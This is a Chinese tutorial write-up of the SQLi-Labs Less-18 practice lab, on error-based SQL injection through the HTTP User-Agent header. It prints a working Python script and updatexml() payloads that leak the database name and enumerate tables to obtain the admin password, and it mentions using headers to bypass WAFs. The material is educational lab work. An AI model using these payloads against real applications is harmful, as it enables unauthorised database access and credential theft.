SQLi-Labs Less-18

2026年9月26日 SQLi-Labs Web安全 SQL注入 Header注入

一、题目信息

  • 题目名称：SQLi-Labs Less-18 (POST - Header Injection - Uagent field - Error based)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / HTTP头部注入 / User-Agent注入
  • 靶场链接：http://localhost:8081/Less-18/（本地环境）
  • 涉及工具：Python (requests库)、Burp Suite (可选)

二、解题步骤

1. 分析题目考什么

本题的核心考点是HTTP 头部注入（User-Agent field）。与之前关卡的注入点不同，Less-18 的 SQL 注入点隐藏在 HTTP 请求头的 User-Agent 字段中。后端在执行登录成功后，会将 User-Agent 记录到数据库中（INSERT 语句）。因此，必须先成功登录，才能触发注入。

2. 怎么想（破题思路）

  • 输入框过滤极严，尝试常规注入失败。
  • 观察页面回显：登录成功后，页面会显示 Your IP ADDRESS is: ... 和 Your User Agent is: ...，说明 User-Agent 被后端记录并回显。
  • 由于浏览器安全机制（Chrome 等现代浏览器禁止前端代码修改 User-Agent），必须使用 Burp Suite、HackBar 或 Python 脚本发送自定义 User-Agent 请求。
  • 关键前置条件：由于只有登录成功才会执行 INSERT，必须先确定正确的账号密码（可通过 Less-17 密码重置获得）。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：密码错误导致注入无效

踩坑情况：直接使用 Python 脚本注入 User-Agent，脚本一直提示“未触发报错”。

原因分析：Less-18 的逻辑是先验证账号密码，只有登录成功，才会执行后面的 INSERT 语句。如果密码错误，不仅 INSERT 不会执行，Payload 也不会被拼接进 SQL 语句。

改进方式：先去 Less-17 关卡，使用密码重置功能将 admin 的密码设置为 admin 或 123456，确保登录成功。

踩坑记录二：浏览器无法修改 User-Agent

踩坑情况：在 Chrome 控制台使用 fetch 修改 User-Agent 时，发现该字段被浏览器拦截，无法发送出去。

原因分析：出于安全考虑，浏览器禁止前端脚本（JS）修改 User-Agent、Referer 等敏感头部，以防伪造指纹。

改进方式：放弃浏览器原生工具，使用 Python 的 requests 库自定义请求头，或者使用 Burp Suite / HackBar 抓包修改。

详细实操步骤（Payload逐字解释）

第一步：重置密码并验证登录

访问 http://localhost:8081/Less-17/，将 admin 的密码重置为 123456。回到 Less-18 页面，输入 admin / 123456 确认登录成功。

第二步：构造 Python 注入脚本

import requests
import re

url = "http://localhost:8081/Less-18/"
headers = {
    # 注意 -- 后面必须有一个空格
    "User-Agent": "' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- ",
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {
    "uname": "admin",
    "passwd": "123456",
    "submit": "Submit"
}

response = requests.post(url, headers=headers, data=data)
match = re.search(r"XPATH syntax error: '(.*?)'", response.text)
if match:
    print("[+] 注入成功！结果:", match.group(1))

逐字解析：

  • User-Agent：将注入 Payload 放入请求头。Payload 中的 ' 用于闭合后端的单引号。
  • and updatexml(1,concat(0x7e,(select database()),0x7e),1)：调用 MySQL 报错函数 updatexml，将 database() 的结果通过 XPath 语法错误抛出。
  • -- ：注释掉后续的 SQL 语句，确保语法正确。
  • data：POST 请求体，必须携带正确的账号密码（admin/123456），确保登录成功，触发 INSERT 语句。

运行脚本，终端输出：[+] 注入成功！结果: ~security~

后续脱库（关键避坑）：

查询表名时，同样面临字符集冲突，必须用十六进制 0x7573657273 代替 'users'：

' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)--

依次爆出 username、password 字段，最终获取 admin 密码，正常登录。

4. 怎么迁移（跨领域联想）

  • HTTP 头部注入（Header Injection）：除了 User-Agent，常见注入点还包括 Referer、X-Forwarded-For（伪造 IP）、Cookie 等。后端若将这些头部存入数据库日志，极易形成注入漏洞。类似地，日志伪造（Log Injection）也是利用头部未过滤的经典攻击。
  • 前置条件思维：Less-18 最大的教学意义在于“漏洞触发有前置条件”。在代码审计中，不能只看一条 SQL 语句，必须梳理完整的业务流。只有登录成功才触发的漏洞，攻击者也需要先掌握有效凭证。
  • 浏览器安全策略：浏览器禁止 JS 修改 UA 是一种“纵深防御”策略，防止 XSS 漏洞被用来伪造指纹绕过 WAF。这提醒我们，安全是多层博弈，渗透测试常常需要跳出浏览器环境，利用底层协议工具（如 Python、Burp）。

三、名词大全与原理深度复盘

1. HTTP 头部注入 (Header Injection)

SQL 注入的一种变体。攻击者将恶意 Payload 插入到 HTTP 请求头（如 User-Agent、Referer）中。如果后端将这些头部的值拼接到 SQL 语句中执行，就会触发注入漏洞。此类漏洞常出现在记录访问日志、统计用户信息的场景中。

2. User-Agent（用户代理）

HTTP 请求头中的标准字段，用于标识发起请求的客户端（浏览器、操作系统等）。在 Less-18 中，后端会记录此字段到数据库，这就是注入的源头。

3. INSERT 语句注入

当后端执行 INSERT 语句插入数据时，如果数据未经过滤就拼接，攻击者可以利用闭合单引号来构造恶意 SQL。由于 INSERT 语句通常不涉及 SELECT 的回显，报错注入在这里极为适用。

4. updatexml() 报错注入

利用 updatexml() 函数解析非法 XPath 字符串时的报错，将查询结果拼接到错误信息中返回给前端。其回显长度上限为 32 字节。

四、题目思考

1. 这跟前面的题有什么区别？

  • 注入位置不同：Less-11~17 都在用户输入的表单字段里，Less-18 在 HTTP 请求头 User-Agent 中。
  • 前置条件更严苛：Less-18 必须登录成功才会触发 INSERT 语句，验证码、密码正确性是前置条件。
  • 工具依赖不同：浏览器自带功能无法完成注入，必须使用 Python 脚本或抓包工具。

2. 这种题目的出现原因（为什么存在）

很多 Web 应用需要记录用户访问日志（例如“哪个浏览器访问了系统”）。开发者为了方便，直接将 HTTP 头中的 User-Agent 拼接到 SQL 中存入日志表。他们认为头部不是用户“直接输入”的，因而忽视了过滤，导致漏洞产生。这与现实世界中“日志注入”的历史背景高度一致。

3. 这种应用在实际中如何体现？

在实际红蓝对抗中，WAF 往往只拦截表单提交的恶意字符，却忽略了对 Header 的检测。渗透测试人员可以利用 User-Agent、X-Forwarded-For（伪造 IP）等头部，绕过 WAF 发起 SQL 注入攻击。

4. 如何抽象理解概念（大白话）

把数据库比作一个“访客登记簿”：

  • 前端输入框（用户名密码）是前门，保安查得很严（过滤很强）。
  • 但保安忽略了你的“车牌号”（User-Agent），直接把它抄进了登记簿里。
  • 你偷偷把车牌号改成了“炸弹代码”，保安照抄进了登记簿（INSERT 语句），结果登记簿爆炸（报错注入），炸出了数据库的秘密。
